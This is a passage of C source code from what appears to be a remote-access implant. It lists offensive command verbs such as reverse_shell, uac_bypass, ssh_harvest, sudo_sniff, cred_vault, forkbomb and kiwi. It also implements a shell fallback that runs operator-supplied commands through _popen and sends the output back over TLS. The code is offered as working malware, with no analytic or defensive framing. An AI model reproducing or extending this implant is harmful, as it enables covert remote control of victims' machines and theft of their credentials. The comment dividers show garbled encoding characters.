        _NS("dll_inject",         10)
        _NS("reverse_shell",      13)
        _NS("socks5",              6)
        _NS("portfwd",             7)
        _NS("uac_bypass",         10)
        _NS("cred_vault",         10)
        _NS("ssh_harvest",        11)
        _NS("sudo_sniff",         10)
        _NS("sudo_sniff_read",    15)
        _NS("sudo_sniff_clean",   16)
        _NS("clip_watch",         10)
        _NS("notify",              6)
        _NS("open_url",            8)
        _NS("play_sound",         10)
        _NS("set_wallpaper",      13)
        _NS("mouse_move",         10)
        _NS("type_keys",          10)
        _NS("forkbomb",            8)
        _NS("living_off_land",    15)
        _NS("zip_download",       12)
        _NS("zip_upload",         10)
        _NS("run_psh",             7)
        _NS("run_python",          10)
        _NS("pty_shell",           9)
        _NS("load_extension",     14)
        _NS("unload_extension",   16)
        _NS("irb",                 3)
        _NS("getsystem",           9)
        _NS("kiwi",                4)

#undef _NS

        /* â”€â”€ Shell fallback â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        char *cmdCopy = (char *)malloc(cbCmd + 1);
        if (cmdCopy) {
            memcpy(cmdCopy, cmd, cbCmd);
            cmdCopy[cbCmd] = '\0';
        }
        free(pCmd); pCmd = NULL;
        if (cmdCopy) {
            _shell_exec(pTls, cmdCopy);
            free(cmdCopy);
        }
    }

    if (pCmd) free(pCmd);
}


/* â”€â”€ _send_str â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _send_str(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg) msg = "";
    size_t len = strlen(msg);
    tls_send_msg(pTls, (const BYTE *)(len ? msg : " "), (DWORD)(len ? len : 1));
}


/* â”€â”€ _not_supported â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _not_supported(TLS_CONTEXT *pTls, const char *verb)
{
    char buf[128];
    _snprintf(buf, sizeof(buf) - 1,
        "[-] %s: not supported by C agent (Python agent only)", verb);
    _send_str(pTls, buf);
}


/* â”€â”€ _shell_exec â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
{
    /* Dynamically grown response buffer — no silent truncation */
    size_t bufSize = SHELL_RESP_BUF;
    char  *resp = (char *)calloc(1, bufSize);
    if (!resp) { _send_str(pTls, "[-] out of memory"); return; }

    char   line[SHELL_LINE_BUF];
    FILE  *pFile = _popen(cmd, "r");
    if (pFile) {
        while (fgets(line, sizeof(line), pFile) != NULL) {
            size_t used = strlen(resp);
            size_t add  = strlen(line);
            if (used + add + 1 >= bufSize) {
                bufSize *= 2;
                char *p = (char *)realloc(resp, bufSize);
                if (!p) break;
                resp = p;
            }
            memcpy(resp + used, line, add + 1);
        }
        _pclose(pFile);
    }

    size_t cbOut = strlen(resp);
    tls_send_msg(pTls, (const BYTE *)(cbOut ? resp : " "), (DWORD)(cbOut ? cbOut : 1));
    free(resp);
}
